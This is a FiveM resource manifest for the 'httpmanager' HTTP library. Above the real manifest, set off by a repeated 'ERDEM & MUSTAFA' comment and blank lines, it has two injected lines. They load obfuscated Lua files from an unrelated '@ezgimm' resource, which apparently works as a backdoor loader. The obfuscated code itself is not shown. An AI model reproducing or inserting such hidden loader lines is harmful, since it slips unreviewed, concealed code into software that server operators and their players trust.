shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA









fx_version "cerulean"
game "common"

name "httpmanager"
author "kibukj"
description "HTTP handler library for FiveM and RedM"
repository "https://github.com/kibook/httpmanager"

server_scripts {
	"url.lua",
	"mime.lua",
	"base64.lua",
	"hash.lua",
	"realms.lua",
	"httphandler.lua",
	"main.lua"
}
lua54 'yes'